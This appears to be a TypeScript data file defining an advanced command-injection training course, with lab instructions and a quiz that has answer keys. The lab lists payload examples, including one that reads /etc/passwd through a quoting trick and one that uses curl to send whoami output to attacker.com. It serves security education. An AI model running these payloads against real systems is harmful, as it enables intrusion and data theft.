import { CourseModule } from '../../../types/course';

export const commandInjectionLevel2Modules: CourseModule[] = [
  {
    id: 'cmd-level2-intro',
    title: 'Level 2: Advanced Command Injection Techniques',
    duration: '2h',
    type: 'video',
    status: 'available',
    description: 'Master advanced command injection techniques including filter bypass and blind injection.',
    videoUrl: 'https://example.com/videos/advanced-cmd-injection',
  },
  {
    id: 'cmd-level2-lab',
    title: 'Advanced Command Injection Lab',
    duration: '3h',
    type: 'lab',
    status: 'available',
    description: 'Practice advanced command injection techniques and bypass methods.',
    labInstructions: `
Advanced Command Injection Laboratory

1. Advanced Techniques:
   - Filter bypass methods
   - Blind command injection
   - Time-based injection
   - Out-of-band techniques

2. Advanced Payloads:
   \`\`\`bash
   # Filter bypass using concatenation
   127.0.0.1 $(c'a't /etc/passwd)
   
   # Using environment variables
   127.0.0.1 $USER
   
   # Time-based injection
   127.0.0.1 \`sleep 5\`
   
   # Out-of-band data exfiltration
   127.0.0.1 \`curl http://attacker.com/\$(whoami)\`
   \`\`\`

3. Filter Bypass Techniques:
   - Character encoding
   - Alternative syntax
   - Environment variables
   - Built-in commands

4. Advanced Scenarios:
   - Blind command injection
   - Filter evasion
   - Data exfiltration
   - Shell spawning
    `,
  },
  {
    id: 'cmd-level2-quiz',
    title: 'Advanced Command Injection Assessment',
    duration: '1h',
    type: 'quiz',
    status: 'available',
    description: 'Test your knowledge of advanced command injection techniques.',
    questions: [
      {
        question: 'Which technique is used when no output is visible?',
        options: [
          'Blind command injection',
          'Direct command execution',
          'Simple command chaining',
          'Basic redirection',
        ],
        correctAnswer: 0,
      },
      {
        question: 'What is the purpose of out-of-band command injection?',
        options: [
          'To exfiltrate data through external channels',
          'To execute faster commands',
          'To bypass authentication',
          'To modify system files',
        ],
        correctAnswer: 0,
      },
      {
        question: 'Which character can be used to bypass space filters?',
        options: [
          'IFS (Internal Field Separator)',
          'Semicolon',
          'Ampersand',
          'Forward slash',
        ],
        correctAnswer: 0,
      },
    ],
  },
];